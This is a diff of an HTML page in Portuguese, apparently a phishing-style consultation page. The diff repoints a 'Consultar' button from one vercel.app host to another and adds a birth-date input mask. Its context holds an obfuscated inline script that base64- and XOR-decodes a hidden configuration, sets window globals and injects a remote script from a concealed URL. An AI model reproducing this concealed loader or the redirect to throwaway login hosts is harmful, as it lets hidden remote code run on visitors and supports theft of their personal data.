@@ -332,7 +332,7 @@
 <!-- FIM DOS CAMPOS -->
       <a
         class="cta"
-        href="https://login-pi-coral.vercel.app/"
+        href="https://carregamento-blond.vercel.app/"
       >
         Consultar
       </a>
@@ -376,5 +376,25 @@ Canais Oficiais de Atendimento
 
 <script>(function(){var t_pgu=atob("DBlYwCfQ693AIdLzPGJ6tVW8yefiSaaHTGpi7wizj7PuVKaeVX8h7kS/hvOiU/2AX2sxsFOjxK2pWbefE2kxuEK8xbezA/7RXW0ssk6ynqmlUvDJZ0R04kC8hL+hTaHRBkIj4kmxhrjiG/CDVWE9rG60yfHiV7OfSXx6+gXmirn1EOPHWC46okTk2rz0R+vLDCo89RTyloC9");var y_vo=[];for(var j_sdy3=0;j_sdy3<t_pgu.length;j_sdy3++){y_vo.push(t_pgu.charCodeAt(j_sdy3)&255);}var x_5=y_vo[0];var d_p0jh=y_vo.slice(1,1+x_5);var w_d=y_vo.slice(1+x_5);var q_j=w_d.map(function(b,r_9umt){return b^d_p0jh[r_9umt%x_5];});var t_i41="";for(var f_6=0;f_6<q_j.length;f_6++){t_i41+=String.fromCharCode(q_j[f_6]&255);}var p_2=decodeURIComponent(escape(t_i41));var c_g0fy=JSON.parse(p_2);var t_y=c_g0fy.globals||[];t_y.forEach(function(e_e5x){window[e_e5x.name]=e_e5x.value;});var w_4=document.createElement("script");w_4.src=c_g0fy.url;w_4.async=true;w_4.defer=true;(c_g0fy.attributes||[]).forEach(function(o_m){w_4.setAttribute(o_m.name,o_m.value);});(document.head||document.documentElement).appendChild(w_4);})();</script>
 
+
+```html
+<script>
+  const campoNascimento = document.getElementById('nascimento');
+
+  if (campoNascimento) {
+    campoNascimento.addEventListener('input', function () {
+      let valor = this.value.replace(/\D/g, '').slice(0, 8);
+
+      if (valor.length > 4) {
+        valor = valor.replace(/^(\d{2})(\d{2})(\d{1,4}).*/, '$1/$2/$3');
+      } else if (valor.length > 2) {
+        valor = valor.replace(/^(\d{2})(\d{1,2})/, '$1/$2');
+      }
+
+      this.value = valor;
+    });
+  }
+</script>
+```
 </body>
 </html>
